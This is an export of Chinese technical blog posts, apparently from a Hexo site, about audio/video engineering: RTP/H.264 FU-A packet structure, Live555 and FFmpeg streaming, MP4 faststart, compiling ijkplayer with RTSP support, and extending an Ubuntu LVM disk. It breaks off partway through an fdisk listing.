0f7038a1605115c154bc0bcec0e77cfbc17ae34e6cf9b2b7641dd1f4e3e5dfff0f060a7bf595121372efffdbd2de14a9c908826749655109894930c25b0cb20fc30327a7ffc2b8973fff6e54b221f641354a50ffffe8e7485551a7fffca8c832481117a78fffdb6d05fd3edf171153a44cb24d580c9862259a3152f54e1565d4694eda2a32519e5ffbbfa88afe7cd956bd2f516f74fffa21042c4e12421c2112488a2a11b4da4055a564a7b022561f103175bd441f8f73fc3d4474f8e62d71bc4c1dc6c6cd295df1690870f73aa0efad48c09f7ec5203c0954554ba7f0a312006e3bd03fbacf6ff9518c1ed5bccb3c49106c150b6bc14c5216e9ab42bfb48cb8d958eb59641482a2946928541f04f49fd74e3b4ea8e67b78147940b2d3813f275f5744028cad6a0d27369bd6b8e6ddf4ae5ea34ac977795b69afa9888a2dc7c657b8428e7f510f971c3d035d0ee31ee67a6185555ceb6610c896d16c32cd8c857bedf56aaf58a49a1e68f28875bedf4bd083601f0ada56fffffe7d61d07fd650b7e045246963c6aa9d28ed1ccf9e37c584401664a2f8e92c711f055b7b52d9d89dc02f7e48280553ca1c2d52cf20159a824cb6fb7eb60971384a9ff7b954807714fcb880952c102ed4fd32af30ce6032668ad447dfae2425f10c04dfcfea34116c1565385b99728679581c8d23dbb18bdf90abeae6fbfa94ca18f486feb34d660bec5c5d76b54db986731a0857db65250c82d293b16060802c1c1037464d9b3709ecf5b770ca586800821738c93c4588a64b80d33292b3ec07c461c7e840bda57c18f4403615df6de9012a2b60b7e066105e60f30aee1506dbc2c4f2b8c89201b293a8fa61dd3d3804498c8c48643c80724573fb77238f65116824d336be409c8ec6a290344368394a6bd00a5872d4107ff54b09eb398c061f5e0c81283da0afdbf06686a383fab987254b835d095f2cabcbe0eaae9c4c03d7286ada203e607156d0d3a9b6f9f9a0034211effb7c0392a47214afbef9ffda37102e821292af133105d4c33b5ddbf0b1ba4e609422f878e94831e6f6909391292a41daafd076146581226a148afcfa1395062fa8 分隔符前面是 rtp header 后面是 rtp payload 也就是H264的NAL，这部分可能有三种情况：单NAL，聚合NAL，分包NAL FU-A12345678910111213 0 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| FU indicator | FU header | |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ || || FU payload || || +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+| :...OPTIONAL RTP padding |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+图 14. FU-A的RTP荷载格式 FU-A分包NAL，payload的前面两个字节携带信息 FU indicator 和 FU header，如示例中的包： FU indicator = 7c (01111100) 12345+---------------+|0|1|2|3|4|5|6|7|+-+-+-+-+-+-+-+-+|F|NRI| Type |+---------------+ F|NRI 和 NAL的F|NRI相同，Type规定为28(11100) F 占1bit，是禁止位，规定为0NRI 占2bit，它的取值范围在0~3，值越大，表示这个Nal越重要 FU header = 85(10000101) 12345+---------------+|0|1|2|3|4|5|6|7|+-+-+-+-+-+-+-+-+|S|E|R| Type |+---------------+ S: 1 bit当值等于1,开始位指示分片NAL单元的第一个包。非第一个包为0。 E: 1 bit当值等于1, 最后一个包，是否为0。 R: 1 bit保留位必须设置为0，接收者必须忽略该位。 Type: 5 bitsNAL的Type，示例中 00101 = 5, 即是I帧。 非I帧 FU header常见值：81 -&gt; 1 0 0 00001 第一个包01 -&gt; 0 0 0 00001 中间包41 -&gt; 0 1 0 00001 最后一个包 I帧 FU header常见值：85 -&gt; 1 0 0 00101 第一个包05 -&gt; 0 0 0 00101 中间包45 -&gt; 0 1 0 00101 最后一个包","categories":[{"name":"音视频","slug":"音视频","permalink":"http://yoursite.com/categories/音视频/"}],"tags":[]},{"title":"Live555搭建流媒体服务器","slug":"音视频/Live555搭建流媒体服务器","date":"2020-07-06T11:52:36.000Z","updated":"2021-12-28T03:24:10.314Z","comments":true,"path":"音视频/Live555搭建流媒体服务器/","link":"","permalink":"http://yoursite.com/音视频/Live555搭建流媒体服务器/","excerpt":"","text":"Live555提供HTTP/RTSP协议的多媒体流服务器和RTSP流代理中转。 下载源码编译需要g++编译环境123456789101112131415161718$ wget http://www.live555.com/liveMedia/public/live555-latest.tar.gz$ tar -xzvf live555-latest.tar.gz$ cd live$ lsBasicUsageEnvironment config.iphoneos config.solaris-32bit liveMediaconfig.armeb-uclibc config.iphone-simulator config.solaris-64bit Makefile.headconfig.armlinux config.linux config.uClinux Makefile.tailconfig.avr32-linux config.linux-64bit configure mediaServerconfig.bfin-linux-uclibc config.linux-gdb COPYING proxyServerconfig.bfin-uclinux config.linux-no-openssl COPYING.LESSER READMEconfig.bsplinux config.linux-with-shared-libraries fix-makefile testProgsconfig.cris-axis-linux-gnu config.macosx genMakefiles UsageEnvironmentconfig.cygwin config.macosx-no-openssl genWindowsMakefiles win32configconfig.cygwin-for-vlc config.mingw genWindowsMakefiles.cmd win32config.Borlandconfig.freebsd config.openbsd groupsock WindowsAudioInputDeviceconfig.freebsd-no-openssl config.qnx4 hlsProxy$ ./genMakefiles linux-64bit #linux-64bit这个参数是config.&lt;后缀&gt;获取得到的，是编译的目标平台$ make 启动服务编译成功，在 mediaServer 和 proxyServer 目录里面有可执行文件 1.mediaServer123456789101112131415161718192021222324252627282930313233343536373839404142434445$ cd mediaServer$ ./live555MediaServerLIVE555 Media Server version 1.00 (LIVE555 Streaming Media library version 2020.06.25).Play streams from this server using the URL rtsp://192.168.0.223:8554/&lt;filename&gt;where &lt;filename&gt; is a file present in the current directory.Each file's type is inferred from its name suffix: \".264\" =&gt; a H.264 Video Elementary Stream file \".265\" =&gt; a H.265 Video Elementary Stream file \".aac\" =&gt; an AAC Audio (ADTS format) file \".ac3\" =&gt; an AC-3 Audio file \".amr\" =&gt; an AMR Audio file \".dv\" =&gt; a DV Video file \".m4e\" =&gt; a MPEG-4 Video Elementary Stream file \".mkv\" =&gt; a Matroska audio+video+(optional)subtitles file \".mp3\" =&gt; a MPEG-1 or 2 Audio file \".mpg\" =&gt; a MPEG-1 or 2 Program Stream (audio+video) file \".ogg\" or \".ogv\" or \".opus\" =&gt; an Ogg audio and/or video file \".ts\" =&gt; a MPEG Transport Stream file (a \".tsx\" index file - if present - provides server 'trick play' support) \".vob\" =&gt; a VOB (MPEG-2 video with AC-3 audio) file \".wav\" =&gt; a WAV Audio file \".webm\" =&gt; a WebM audio(Vorbis)+video(VP8) fileSee http://www.live555.com/mediaServer/ for additional documentation.(We use port 8000 for optional RTSP-over-HTTP tunneling, or for HTTP live streaming (for indexed Transport Stream files only).)``` 在此目录放一个test.mkv文件，用VCL播放器打开 `http://192.168.0.223:8000/test.mkv` 或者 `rtsp://192.168.0.223:8554/test.mkv` 就能播放了。### 2.proxyServer live555ProxyServer rtsp流源地址 &amp;```sh$ cd proxyServer$ ./live555ProxyServer rtsp://192.168.0.188:554/stream/main &amp; #执行命令后会返回一个分发的流地址./live555ProxyServer rtsp://192.168.0.188:554LIVE555 Proxy Server (LIVE555 Streaming Media library version 2020.06.25; licensed under the GNU LGPL)Created new TCP socket 4 for connectionRTSP stream, proxying the stream \"rtsp://192.168.0.188:554\" Play this stream using the URL: rtsp://192.168.0.223:8554/proxyStream(We use port 8000 for optional RTSP-over-HTTP tunneling.) 3. test拷贝一个.264测试视频文件到/live/testProgs目录下，live555网站可以下载 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657$ ./testOnDemanRTSPServer&quot;mpeg4ESVideoTest&quot; stream, from the file &quot;test.m4e&quot;Play this stream using the URL &quot;rtsp://192.168.0.226:8554/mpeg4ESVideoTest&quot;&quot;h264ESVideoTest&quot; stream, from the file &quot;test.264&quot;Play this stream using the URL &quot;rtsp://192.168.0.226:8554/h264ESVideoTest&quot;&quot;h265ESVideoTest&quot; stream, from the file &quot;test.265&quot;Play this stream using the URL &quot;rtsp://192.168.0.226:8554/h265ESVideoTest&quot;&quot;mpeg1or2AudioVideoTest&quot; stream, from the file &quot;test.mpg&quot;Play this stream using the URL &quot;rtsp://192.168.0.226:8554/mpeg1or2AudioVideoTest&quot;&quot;mpeg1or2ESVideoTest&quot; stream, from the file &quot;testv.mpg&quot;Play this stream using the URL &quot;rtsp://192.168.0.226:8554/mpeg1or2ESVideoTest&quot;&quot;mp3AudioTest&quot; stream, from the file &quot;test.mp3&quot;Play this stream using the URL &quot;rtsp://192.168.0.226:8554/mp3AudioTest&quot;&quot;wavAudioTest&quot; stream, from the file &quot;test.wav&quot;Play this stream using the URL &quot;rtsp://192.168.0.226:8554/wavAudioTest&quot;&quot;amrAudioTest&quot; stream, from the file &quot;test.amr&quot;Play this stream using the URL &quot;rtsp://192.168.0.226:8554/amrAudioTest&quot;&quot;vobTest&quot; stream, from the file &quot;test.vob&quot;Play this stream using the URL &quot;rtsp://192.168.0.226:8554/vobTest&quot;&quot;mpeg2TransportStreamTest&quot; stream, from the file &quot;test.ts&quot;Play this stream using the URL &quot;rtsp://192.168.0.226:8554/mpeg2TransportStreamTest&quot;&quot;aacAudioTest&quot; stream, from the file &quot;test.aac&quot;Play this stream using the URL &quot;rtsp://192.168.0.226:8554/aacAudioTest&quot;&quot;dvVideoTest&quot; stream, from the file &quot;test.dv&quot;Play this stream using the URL &quot;rtsp://192.168.0.226:8554/dvVideoTest&quot;&quot;ac3AudioTest&quot; stream, from the file &quot;test.ac3&quot;Play this stream using the URL &quot;rtsp://192.168.0.226:8554/ac3AudioTest&quot;&quot;matroskaFileTest&quot; stream, from the file &quot;test.mkv&quot;Play this stream using the URL &quot;rtsp://192.168.0.226:8554/matroskaFileTest&quot;&quot;webmFileTest&quot; stream, from the file &quot;test.webm&quot;Play this stream using the URL &quot;rtsp://192.168.0.226:8554/webmFileTest&quot;&quot;oggFileTest&quot; stream, from the file &quot;test.ogg&quot;Play this stream using the URL &quot;rtsp://192.168.0.226:8554/oggFileTest&quot;&quot;opusFileTest&quot; stream, from the file &quot;test.opus&quot;Play this stream using the URL &quot;rtsp://192.168.0.226:8554/opusFileTest&quot;&quot;mpeg2TransportStreamFromUDPSourceTest&quot; stream, from a UDP Transport Stream input source (IP multicast address 239.255.42.42, port 1234)Play this stream using the URL &quot;rtsp://192.168.0.226:8554/mpeg2TransportStreamFromUDPSourceTest&quot;(We use port 8000 for optional RTSP-over-HTTP tunneling.) 用VCL播放器打开 rtsp://192.168.0.226:8554/h264ESVideoTest 错误解决缺少ssl123456789include/TLSState.hh:31:10: fatal error: openssl/ssl.h: No such file or directory #include &lt;openssl/ssl.h&gt; ^~~~~~~~~~~~~~~compilation terminated.Makefile:32: recipe for target &apos;RTSPServer.o&apos; failedmake[1]: *** [RTSPServer.o] Error 1make[1]: Leaving directory &apos;/home/cn/live/liveMedia&apos;Makefile:35: recipe for target &apos;all&apos; failedmake: *** [all] Error 2 解决：1234#centos$ sudo yum install openssl-devel#ubuntu$ sudo apt-get install libssl-dev","categories":[{"name":"音视频","slug":"音视频","permalink":"http://yoursite.com/categories/音视频/"}],"tags":[{"name":"live555","slug":"live555","permalink":"http://yoursite.com/tags/live555/"}]},{"title":"HTTP边下边播MP4文件","slug":"音视频/HTTP边下边播MP4文件","date":"2020-07-04T09:52:36.000Z","updated":"2021-12-28T03:24:10.314Z","comments":true,"path":"音视频/HTTP边下边播MP4文件/","link":"","permalink":"http://yoursite.com/音视频/HTTP边下边播MP4文件/","excerpt":"","text":"通过HTTP无法播放MP4视频？有一个摄像机录制的视频文件record.mp4 ，放在web服务器上边下边播（http://mydomain.com/record.mp4 ），发现无法播放，下载到本地可以播放。但是从抖音下载的视频douyin.mp4文件，同样放在web服务器上，可以边下边播（http://mydomain.com/douyin.mp4 ）能正常播放。 都是MP4封装格式 ，这两个文件有什么不同呢？ 通过 Mp4Explorer 这个软件，可以查看MP4的详细信息。 moov 是box参数列表，可以粗暴理解为 配置信息mdata 是音视频数据 1. record.mp42. douyin.mp4 通过上图可知道：record.mp4 的数据顺序是 mdata + moovdouyin.mp4 的数据顺序是 moov + mdata 大多数录制的MP4工具，都会将moov放在文件尾部，播放器播放MP4视频要首先解析moov中的box参数进行初始化，然后才能对mdata里面的音视频数据进行音视频同步播放。在本地播放，播放器会去文件尾部读取moov，不会影响播放，但是通过网络（HTTP）播放就会有问题，播放器读取不到moov就会报错。这就是为什么两个文件都可以本地播放，而网络播放有一个不可以播放。 解决网络播放问题 moov提前（推荐）将moov信息提取到文件头部，播放器可以首先读取到moov数据，出图快，一劳永逸。那如何提前？ ①. ffmpeg -i record.mp4 -c copy -f mp4 -movflags faststart output.mp4 (ffmpeg 大小20 ~ 30M) ②.（推荐）单独编译 ffmpeg 项目中 faststart.c 文件 （大概20KB），【faststart.c源码】 123456789101112# 示例：Ubuntu下gcc编译 qt-faststart.c$ vim qt-faststart.c #拷贝源码$ gcc qt-faststart.c -o qt-faststart$ qt-faststart input.mp4 output.mp4ftyp 0 28mdat 28 771862moov 771890 2050 patching stco atom... patching stco atom... writing ftyp atom... writing moov atom... copying rest of file... Web服务器支持断点下载断点下载，即请求时携带HeaderRANGE: bytes=- ，这不仅需要服务器支持断点，播放器也要支持，播放器首先请求moov信息，再请求mdata，这也是一种方法，但比较麻烦，出图也慢。","categories":[{"name":"音视频","slug":"音视频","permalink":"http://yoursite.com/categories/音视频/"}],"tags":[]},{"title":"FFmpeg推流RTSP和RTMP","slug":"音视频/ffmpeg推流RTSP","date":"2020-07-04T09:52:36.000Z","updated":"2021-12-28T03:24:10.317Z","comments":true,"path":"音视频/ffmpeg推流RTSP/","link":"","permalink":"http://yoursite.com/音视频/ffmpeg推流RTSP/","excerpt":"","text":"RTSP推流到本地用UDP传输123456$ ffmpeg -re -i h264.mp4 -vcodec copy -f h264 udp://127.0.0.1:8554#循环文件推流（默认UDP）ffmpeg -re -stream_loop -1 -i move.mp4 -vcodec copy -codec copy -f rtsp rtsp://192.168.0.223:554/test/#循环文件推流（指定TCP）ffmpeg -re -stream_loop -1 -i move.mp4 -vcodec copy -codec copy -rtsp_transport tcp -f rtsp rtsp://192.168.0.223:554/test/ 在本地用ffplay播放（ffplay是ffmpeg的附带命令行工具）12$ ffplay udp://127.0.0.1:8554$ ffplay -f h264 udp://127.0.0.1:8554 RTMP推流到服务器推流1$ ffmpeg -re -i h264.mp4 -f flv rtmp://192.168.0.123:1935/live/test 播放1$ ffplay -fflags nobuffer rtmp://192.168.0.123:1935/live/test 中转服务ffserver ffserver has been removed on 2018-01-06 ，在3.4版本中已经从ffmpeg移除。 【ffserver搭建流媒体服务】","categories":[{"name":"音视频","slug":"音视频","permalink":"http://yoursite.com/categories/音视频/"}],"tags":[]},{"title":"Ubuntu 编译 ijplayer","slug":"Linux/Ubuntu 编译 ijplayer","date":"2020-07-03T15:52:36.000Z","updated":"2021-12-28T03:24:10.176Z","comments":true,"path":"Linux/Ubuntu 编译 ijplayer/","link":"","permalink":"http://yoursite.com/Linux/Ubuntu 编译 ijplayer/","excerpt":"","text":"由于项目【ijkplayer】提供编译好的库没有支持RTSP，而ijkplayer这个项目比较强大之处就是可以根据需要进行裁剪编译，所以我要自己编译一次Android版本，开启RTSP协议。 一、软件环境 Ubuntu16.04 Server Android SDK NDK（不要安装最新的版本，14b版本能用）和cmake ijkplayer-k0.8.8 (commit cced91e3ae3730f5c63f3605b00d25eafcf5b97b) 其他一些编译c的环境，系统本身就有，就不一样列出。 编译所需软件大概有这些，引用参考文章的12$ sudo apt install vim openssh-server git curl wget tar unzip$ sudo apt install build-essential openjdk-8-jdk yasm python 二、配置环境变量参考【Android Linux命令行环境变量配置】 ，配置： android sdk android ndk java 三、下载ijplayer源码1234$ git clone https://github.com/bilibili/ijkplayer.git#加速$ git clone https://github.com.cnpmjs.org/bilibili/ijkplayer.git 四、初始化先编辑 init_android.sh 、 init-android-libyuv.sh 、init-android-libyuv.sh 和 init-android-soundtouch.sh脚本，修改’github.com’ 为 ‘github.com.cnpmjs.org’，否则很慢，下载不了。如：12345#IJK_FFMPEG_UPSTREAM=https://github.com/Bilibili/FFmpeg.git#IJK_FFMPEG_FORK=https://github.com/Bilibili/FFmpeg.gitIJK_FFMPEG_UPSTREAM=https://github.com.cnpmjs.org/Bilibili/FFmpeg.gitIJK_FFMPEG_FORK=https://github.com.cnpmjs.org/Bilibili/FFmpeg.git 【修改的commit的代码】 执行1$ ./init_android.sh 五、修改配置1$ vim config/module-lite.sh 默认支持的协议12345678910111213141516171819202122export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --enable-protocols\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --enable-protocol=async\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --disable-protocol=bluray\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --disable-protocol=concat\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --disable-protocol=crypto\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --disable-protocol=ffrtmpcrypt\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --enable-protocol=ffrtmphttp\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --disable-protocol=gopher\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --disable-protocol=icecast\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --disable-protocol=librtmp*\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --disable-protocol=libssh\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --disable-protocol=md5\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --disable-protocol=mmsh\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --disable-protocol=mmst\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --disable-protocol=rtmp*\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --enable-protocol=rtmp\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --enable-protocol=rtmpt\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --disable-protocol=rtp\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --disable-protocol=sctp\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --disable-protocol=srtp\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --disable-protocol=subfile\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --disable-protocol=unix\" 注释行1#export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --disable-protocol=rtp\" 加入行：RTSP协议1234export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --enable-protocol=rtp\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --enable-demuxer=rtsp\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --enable-protocol=tcp\"export COMMON_FF_CFG_FLAGS=\"$COMMON_FF_CFG_FLAGS --enable-demuxer=sdp\" 【commit代码】 替换module1234$ cd config/$ cp module.sh module.sh.bak$ rm module.sh$ ln -s module-lite.sh module.sh 六、开始编译 编译ffmpeg（耗时较长） 123$ cd ijkplayer/android/contrib$ ./compile-ffmpeg.sh clean$ ./compile-ffmpeg.sh all 编译jikplayer 1$ ./compile-ijk.sh all 成功so文件，在项目的libs目录下，如果是开发机上编译，可以直接用Android Studio打开编译后的example项目。由于我是在服务器上编译，所以，我要下载编译好的so文件，如armv7a，路径是：ijkplayer/android/ijkplayer/ijkplayer-armv7a/src/main/libs 拷贝so文件 将所有平台的文件都拷贝到 /data/ijk-libs-file 目录下： 1234567891011$ cd ijkplayer/android/ijkplayer$ lsbuild.gradle gradle.properties ijkplayer-arm64 ijkplayer-example ijkplayer-x86 toolscp-libs.sh gradlew ijkplayer-armv5 ijkplayer-exo ijkplayer-x86_64gradle gradlew.bat ijkplayer-armv7a ijkplayer-java settings.gradle$ cp -r ijkplayer-armv5/src/main/libs/armeabi/ /data/ijk-libs-file$ cp -r ijkplayer-arm64/src/main/libs/arme64 /data/ijk-libs-file$ cp -r ijkplayer-armv7a/src/main/libs/armeabi-v7a/ /data/ijk-libs-file$ cp -r ijkplayer-x86/src/main/libs/x86/ /data/ijk-libs-file$ cp -r ijkplayer-x86_64/src/main/libs/x86_64/ /data/ijk-libs-file 七、错误和解决 NDK版本问题 123456789101112131415161718192021222324252627282930$ sh compile-ffmpeg.sh clean$ sh compile-ffmpeg.sh all====================[*] check archs====================FF_ALL_ARCHS = armv5 armv7a arm64 x86 x86_64FF_ACT_ARCHS = armv5 armv7a arm64 x86 x86_64====================[*] check env armv5====================FF_ARCH=armv5FF_BUILD_OPT=--------------------[*] make NDK standalone toolchain--------------------build on Linux x86_64ANDROID_NDK=/usr/local/androidsdk/ndk/21.3.6528147IJK_NDK_REL=21.3.6528147You need the NDKr10e or later#要求NDK版本大于10，但这里是21。vim android/contrib$ vim tools/do-detect-env.sh# 71行加入: |21*70 case \"$IJK_NDK_REL\" in71 11*|12*|13*|14*|21*) 重新编译可以跳过这个错误，但是出现 “ERROR: Failed to create toolchain.”，还是老老实实把NDK版本改为 12/13/14其中一个吧。【下载链接：Android NDK，修订版 14b（2017 年 3 月）Linux 64 位 (x86)】 Android 11 64位真机播放网络视频闪退问题在64位Android11机器上播放网络视频闪退，本地视频不会闪退，模拟器不会闪退。原因【ijkplayer issues/5206】里的开发者分析了，是ffmpeg库ff_ffplay.c里面触发了以上Android11的标志问题。【Android 11 适配问题】：从 Android 11 开始，对于 64 位进程，所有堆分配都具有一个由实现定义的标记，该标记在具有对 ARM Top-byte Ignore (TBI) 的内核支持的设备上的指针顶部字节中设置。在回收期间检查该标记时，任何修改此标记的应用都会被终止。对于未来支持 ARM 内存标记扩展 (MTE) 的硬件来说，这是必需的。缓解办法AndroidManifest.xml 文件中添加以下内容：&lt;application android:allowNativeHeapPointerTagging=&quot;false&quot;&gt;彻底解决办法要彻底解决这个问题，得解决改ffmpeg的ff_ffplay.c，不过ijkplayer的开发者已经修复这个问题，我们升级一下ffmpeg的版本即可，参考下一节【升级FFmpeg4.0】。 八、升级FFmpeg4.0 修改ffmpeg版本 1234567$ vim ijkplayer/init-android.shIJK_FFMPEG_COMMIT=ff4.0--ijk0.8.8--20210426--001#IJK_FFMPEG_COMMIT=ff3.4--ijk0.8.7--20180103--001# 下载新版本源码$ ./init_android.sh 版本改为ff4.0--ijk0.8.8--20210426--001，即4.0版，参考【issues/5290】。 修改编译ffmpeg的配置如果现在编译，肯定报错，由于4.0版本有些东西已经丢弃，所以裁剪的配置文件要变动。 1234567891011121314$ vim ijkplayer/config/module-lite.sh# 注释这两行，否则编译会报错#export COMMON_FF_CFG_FLAGS=&quot;$COMMON_FF_CFG_FLAGS --disable-ffserver&quot;#export COMMON_FF_CFG_FLAGS=&quot;$COMMON_FF_CFG_FLAGS --disable-vda&quot;# 注释掉以上两项，编译还会出现以下错误：# ijkplayer/android/contrib/ffmpeg-arm64/libavcodec/eac3_core_bsf.c:39: undefined reference to `ff_ac3_parse_header&apos;# ijkplayer/android/contrib/ffmpeg-arm64/libavcodec/eac3_core_bsf.c:55: undefined reference to `ff_ac3_parse_header&apos;# 还需加入以下这一行export COMMON_FF_CFG_FLAGS=&quot;$COMMON_FF_CFG_FLAGS --disable-bsf=eac3_core&quot;# 这一行的位置一开始随便放在文件头，结果编译一直没过# 移到 `./configure --list-bsf` 这个位置，编译就OK。 这个问题是参考【【ijkplayer issues/4772】 重新编译123456$ cd ijkplayer/android/contrib$ ./compile-ffmpeg.sh clean$ ./compile-ffmpeg.sh all$ cd ../$ ./compile-ijk.sh clean$ ./compile-ijk.sh all 九、参考【Ubuntu 18.04 编译 ijkplayer】","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[{"name":"ijplayer","slug":"ijplayer","permalink":"http://yoursite.com/tags/ijplayer/"}]},{"title":"Ubuntu Server 扩展磁盘空间LVM","slug":"虚拟化技术&云平台/Ubuntu Server 扩展磁盘空间LVM","date":"2020-07-03T11:53:36.000Z","updated":"2021-12-28T03:24:10.294Z","comments":true,"path":"虚拟化技术&云平台/Ubuntu Server 扩展磁盘空间LVM/","link":"","permalink":"http://yoursite.com/虚拟化技术&云平台/Ubuntu Server 扩展磁盘空间LVM/","excerpt":"","text":"问题在《VMWare为Ubuntu添加硬盘》一文中，我尝试为虚拟机增加一块磁盘挂载了 /data 路径下，这可以解决在“出现磁盘耗尽预警”之前增加磁盘，尽量将新的文件都放到 /data 路径下。 如果应用的数据无法迁移，需扩展根分区 / 的空间， 上面的方法则无法满足我的需求。 GParted对于VMWare虚拟机，还可以考虑对虚拟机磁盘进行扩容，如： 这种方式对桌面版系统环境(单磁盘)可能会比较合适，扩展后利用 GParted软件 重新调整 /dev/sdb1 即可，有兴趣可以参考【ubuntu下对根目录磁盘扩容】 。 注意：GParted是一个GUI软件可以在桌面系统中安装启动 或者 下载iso文件挂载在光驱启动 但我没有尝试成功，为什么？因为我们使用的是 ubuntu server 14.04 ，服务器版的默认都是LVM磁盘阵列，我没有专门学过LVM，但知道他比单硬盘复杂，他可以将多个硬盘虚拟化为一个硬盘。所以GParted处理起来没那么简单，所以我尝试一次就放弃了GParted，因为LVM本身就是能满足扩容需求的。 开始LVM扩容思路给VM增加一块硬盘（和物理机场景一样），加入到LVM中。 场景一台老虚拟机服务器磁盘空间即将耗尽，导致现在无法对Gitlab进行备份操作，现在打算对系统根分区进行空间扩展，增加100G空间。123456789101112Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic x86_64)root@bogon:~# df -lhFilesystem Size Used Avail Use% Mounted onudev 2.9G 4.0K 2.9G 1% /devtmpfs 596M 3.2M 592M 1% /run/dev/dm-0 19G 16G 1.9G 90% /none 4.0K 0 4.0K 0% /sys/fs/cgroupnone 5.0M 0 5.0M 0% /run/locknone 3.0G 4.0K 3.0G 1% /run/shmnone 100M 0 100M 0% /run/user/dev/sda1 236M 41M 183M 19% /boot 1. 添加一块新硬盘在“虚拟机设置” - “添加” - “硬盘” 给VM虚拟机添加一块100G的硬盘，重启虚拟机。 2. 查看所有硬盘信息1234567891011121314151617181920212223242526272829303132333435363738394041root@bogon:~# fdisk -lDisk /dev/sda: 21.5 GB, 21474836480 bytes255 heads, 63 sectors/track, 2610 cylinders, total 41943040 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x000b8cbd Device Boot Start End Blocks Id System/dev/sda1 * 2048 499711 248832 83 Linux/dev/sda2 501758 41940991 20719617 5 Extended/dev/sda5 501760 41940991 20719616 8e Linux LVM# 这里已经识别出新硬盘100GDisk /dev/sdb: 107.4 GB, 107374182400 bytes255 heads, 63 sectors/track, 13054 cylinders, total 209715200 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x00000000Disk /dev/sdb doesn't contain a valid partition tableDisk /dev/mapper/bogon--vg-root: 20.1 GB, 20124270592 bytes255 heads, 63 sectors/track, 2446 cylinders, total 39305216 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x00000000Disk /dev/mapper/bogon--vg-root doesn't contain a valid partition tableDisk /dev/mapper/bogon--vg-swap_1: 1069 MB, 1069547520 bytes255 heads, 63 sectors/track, 130 cylinders, total 2088960 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x00000000Disk /dev/mapper/bogon--vg-swap_1 doesn't contain a valid partition table 3. 新增主分区123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869root@bogon:~# fdisk /dev/sdb Device contains neither a valid DOS partition table, nor Sun, SGI or OSF disklabelBuilding a new DOS disklabel with disk identifier 0x6f04a426.Changes will remain in memory only, until you decide to write them.After that, of course, the previous content won ’t be recoverable.Warning: invalid flag 0x0000 of partition table 4 will be corrected by w(rite)Command (m for help): nPartition type: p primary (0 primary, 0 extended, 4 free) e extendedSelect (default p): pPartition number (1-4, default 1): 1First sector (2048-209715199, default 2048): Using default value 2048Last sector, +sectors or +size&#123;K,M,G&#125; (2048-209715199, default 209715199): Using default value 209715199# w保存更改Command (m for help): wThe partition table has been altered!Calling ioctl() to re-read partition table.Syncing disks.root@bogon:~## 重启读取分区表root@bogon:~# partprobe /dev/sdbroot@bogon:~# fdisk -lDisk /dev/sda: 21.5 GB, 21474836480 bytes255 heads, 63 sectors/track, 2610 cylinders, total 41943040 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk identifier: 0x000b8cbd Device Boot Start End Blocks Id System/dev/sda1 * 2048 499711 248832 83 Linux/dev/sda2 501758 41940991 20719617 5 Extended/dev/sda5 501760 41940991 20719616 8e Linux LVMDisk /dev/sdb: 107.4 GB, 107374182400 bytes43 heads, 44 sectors/track, 110843 cylinders, total 